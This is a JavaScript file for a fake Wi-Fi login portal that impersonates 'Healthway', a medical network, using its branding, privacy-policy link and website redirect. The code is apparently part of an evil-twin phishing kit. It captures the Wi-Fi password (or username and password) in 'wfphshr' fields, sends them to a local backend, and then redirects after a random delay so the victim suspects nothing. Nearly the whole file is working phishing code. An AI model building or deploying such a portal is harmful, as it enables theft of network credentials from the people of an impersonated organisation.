// ------------------------------------------------------------------------------ //
// ---------------------------  EDIT JS Values Here  ---------------------------- //
// ------------------------------------------------------------------------------ //

// Change to the specific company name (or Guest)
// Set a custom header message
const companyName = 'Healthway';
const messageHeader = 'WiFi Portal Login';

// Change to replicate WPA personal or Radius auth captive portals
const isUsernameAndPassword = false;

// Change logo image 
const logoImg = 'static/img/hw_clean.jpg';

// Change logo width and height
const logoWidth = '200px';
const logoHeight = '125px';

// Change favicon image 
const faviconImg = 'static/img/hw_favicon.png';

// Change round or square edges for the containers
const isRoundEdges = true;

// Error message (null validation only)
// Generic message: Please enter your username and password.
const customErrorMessage = 'Please enter the password.';

// Change to company's privacy policy URL
const privacyPolicyLink = 'https://healthwaymedicalnetwork.com.ph/privacy-policy/';

// Change to image or HTML hex gradient colors
// If isBackground = false; Select gradient designs
const isBackground = true;

// Change background image
const backgroundImg = 'static/img/hw_wp.png';

// If useGradient is true; and defaultGradient is false,
// apply the desired custom configuration
// Use HTML Hex color codes
// Select from 'linear' or 'radial'
// Select 1 to 8 for predefined directions
// Gradient One = darker tone (preferred)
// Gradient Two = lighter tone (preferred)
const gradientOne = '#00B9C9';
const gradientTwo = '#0071CD';
const gradientType = 'radial';
const direction = 4;

// Change heading colors
const headingColor = gradientTwo;

// Change login container color
const containerColor = '#fff';

// Input field colors
const inputBorderColor = '#999999';
const inputTextColor = '#000';
const inputBackgroundColor = containerColor;
const inputFocusColor = gradientTwo;
const inputTextPlaceholderColor = inputBorderColor;

// Buttons colors
const connectAcceptBtn = headingColor;
const connectAcceptText = containerColor;
const connectAcceptHover = '#FA9313';
//const connectAcceptHover = gradientOne;

// Privacy policy link colors
const privacyPolicyLinkColor = headingColor;
const privacyPolicyLinkHoverColor = gradientOne;

// Page redirects (Corporate web domain)
const pageRedirect = 'https://healthwaymedicalnetwork.com.ph/';

// ------------------------------------------------------------------------------ //
function setFavicon(e){const t=document.querySelector("link[rel~='icon']")||document.createElement("link");t.rel="icon",t.href=e,document.getElementsByTagName("head")[0].appendChild(t)}function applyPageHeaders(){document.title=`${companyName} Wi-Fi Captive Portal`,setFavicon(faviconImg),adjustLogoSize()}function adjustLogoSize(){const e=document.querySelector(".logo");e&&(e.style.width=logoWidth,e.style.height=logoHeight)}function applyPrivacyPolicyLink(){const e=document.getElementById("privacy-policy");e&&(e.setAttribute("href",privacyPolicyLink),e.setAttribute("target","_blank"))}function applyBranding(){document.querySelectorAll("#company-name").forEach((e=>{e.textContent=companyName}));const e=document.getElementById("custom-heading");e&&(e.textContent=messageHeader);const t=document.getElementById("logo");t&&(t.src=logoImg)}function applyThemeConfig(){const e=document.body;if(isBackground)e.classList.add("image-bg"),e.classList.remove("gradient-bg"),e.style.backgroundImage=`url('${backgroundImg}')`,e.style.backgroundSize="cover",e.style.backgroundRepeat="no-repeat",e.style.backgroundPosition="center",e.style.backgroundAttachment="fixed";else{e.classList.add("gradient-bg"),e.classList.remove("image-bg");const t=["to top","to bottom","to left","to right","to top left","to top right","to bottom left","to bottom right"][Math.max(0,Math.min(direction-1,7))];e.style.background=`${gradientType}-gradient(${t}, ${gradientOne}, ${gradientTwo})`,e.style.backgroundRepeat="no-repeat",e.style.backgroundSize="cover",e.style.backgroundAttachment="fixed"}const t=document.getElementById("container"),n=document.querySelectorAll(".input-field"),o=document.querySelectorAll(".connect-btn, .accept-btn"),c=isRoundEdges?"rounded-container":"square-container",r=isRoundEdges?"rounded-input":"square-input",s=isRoundEdges?"rounded-button":"square-button";t?.classList.add(c),n.forEach((e=>e.classList.add(r))),o.forEach((e=>e.classList.add(s))),document.documentElement.style.setProperty("--gradient-start",gradientOne),document.documentElement.style.setProperty("--gradient-end",gradientTwo),document.documentElement.style.setProperty("--heading-color",headingColor),document.documentElement.style.setProperty("--container-color",containerColor),document.documentElement.style.setProperty("--input-background-color",inputBackgroundColor),document.documentElement.style.setProperty("--input-border-color",inputBorderColor),document.documentElement.style.setProperty("--input-focus-color",inputFocusColor),document.documentElement.style.setProperty("--input-text-color",inputTextColor),document.documentElement.style.setProperty("--input-text-placeholder-color",inputTextPlaceholderColor),document.documentElement.style.setProperty("--connect-accept-bg",connectAcceptBtn),document.documentElement.style.setProperty("--connect-accept-text",connectAcceptText),document.documentElement.style.setProperty("--privacy-link-color",privacyPolicyLinkColor),document.documentElement.style.setProperty("--privacy-link-hover-color",privacyPolicyLinkHoverColor);const d=connectAcceptHover&&""!==connectAcceptHover.trim();document.documentElement.style.setProperty("--connect-accept-hover",d?connectAcceptHover:connectAcceptBtn)}function handleInputVisibility(){const e=document.getElementById("username");!isUsernameAndPassword&&e&&(e.style.display="none")}function enforcePasswordLengthForWPA(){if(!isUsernameAndPassword){const e=document.getElementById("password"),t=document.getElementById("connect-btn");e&&t&&(t.disabled=!0,t.style.opacity="0.6",t.style.cursor="not-allowed",e.addEventListener("input",(()=>{e.value.trim().length>=8?(t.disabled=!1,t.style.opacity="1",t.style.cursor="pointer"):(t.disabled=!0,t.style.opacity="0.6",t.style.cursor="not-allowed")})))}}function enableEnterKeyToSubmit(){document.addEventListener("keydown",(function(e){if("Enter"===e.key){e.preventDefault();const t=document.getElementById("connect-btn"),n=document.getElementById("accept-btn");t&&null!==t.offsetParent&&!t.disabled?t.click():n&&null!==n.offsetParent&&!n.disabled&&n.click()}}))}function clearErrorOnInput(){const e=document.getElementById("username"),t=document.getElementById("password"),n=document.getElementById("error-message");e&&e.addEventListener("input",(()=>{n.textContent=""})),t&&t.addEventListener("input",(()=>{n.textContent=""}))}function validateCredentials(){const e=document.getElementById("username"),t=document.getElementById("password"),n=document.getElementById("error-message"),o=e?e.value.trim():"",c=t?t.value.trim():"";if(n.style.visibility="visible",n.style.opacity="1",isUsernameAndPassword){if(""===o||""===c)return n.innerText=customErrorMessage,hideErrorMessageAfterDelay(),{success:!1}}else if(""===c)return n.innerText=customErrorMessage,hideErrorMessageAfterDelay(),{success:!1};return n.style.visibility="hidden",n.style.opacity="0",{success:!0,username:o,password:c}}function hideErrorMessageAfterDelay(){const e=document.getElementById("error-message");setTimeout((()=>{e.style.opacity="0",e.style.visibility="hidden"}),4e3)}function handleRedirect(){const e=Math.floor(2e3*Math.random())+4e3,t=document.getElementById("accept-btn");if(!t)return;t.disabled=!0,t.textContent="Connecting",t.style.opacity="0.6";const n=document.getElementById("username")?.value.trim()||"",o=document.getElementById("password")?.value.trim()||"",c=isUsernameAndPassword?`wfphshr-username=${encodeURIComponent(n)}&wfphshr-password=${encodeURIComponent(o)}`:`wfphshr-password=${encodeURIComponent(o)}`,r=new XMLHttpRequest;r.open("POST","login",!0),r.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),r.send(c),setTimeout((()=>{window.location.href=pageRedirect}),e)}function sendToBackend(e,t,n){const o=new XMLHttpRequest;o.open("POST",e,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded");const c=Object.keys(t).map((e=>encodeURIComponent(e)+"="+encodeURIComponent(t[e]))).join("&");o.onreadystatechange=function(){4===o.readyState&&200===o.status&&"function"==typeof n&&n()},o.send(c)}function showAcceptScreen(){document.querySelector(".container").style.opacity="0",setTimeout((()=>{document.getElementById("login-form").style.display="none";const e=document.getElementById("accept-btn");e&&(e.classList.remove("hidden"),e.classList.add("fade-in-button")),document.querySelector(".container").style.opacity="1"}),1e3)}function connect(){const e=document.getElementById("username"),t=document.getElementById("password"),n=document.getElementById("error-message"),o=e?e.value.trim():"",c=t?t.value.trim():"";if(n.style.visibility="visible",n.style.opacity="1",isUsernameAndPassword){if(""===o||""===c)return n.innerText=customErrorMessage,void hideErrorMessageAfterDelay()}else if(c.length<8)return n.innerText="Password must be at least 8 characters.",void hideErrorMessageAfterDelay();n.style.visibility="hidden",n.style.opacity="0",isUsernameAndPassword?sendToBackend("login",{"wfphshr-username":o,"wfphshr-password":c},showAcceptScreen):sendToBackend("login",{"wfphshr-password":c},showAcceptScreen),document.querySelector(".container").style.opacity="0",setTimeout((()=>{document.getElementById("login-form").style.display="none";const e=document.getElementById("accept-btn");e&&(e.classList.remove("hidden"),e.classList.add("fade-in-button")),document.querySelector(".container").style.opacity="1"}),1e3)}document.addEventListener("DOMContentLoaded",(()=>{applyThemeConfig(),applyPageHeaders(),applyBranding(),applyPrivacyPolicyLink(),handleInputVisibility(),enforcePasswordLengthForWPA(),clearErrorOnInput(),enableEnterKeyToSubmit();const e=document.getElementById("connect-btn");e&&e.addEventListener("click",connect);const t=document.getElementById("accept-btn");t&&t.addEventListener("click",(e=>{handleRedirect()}))}));
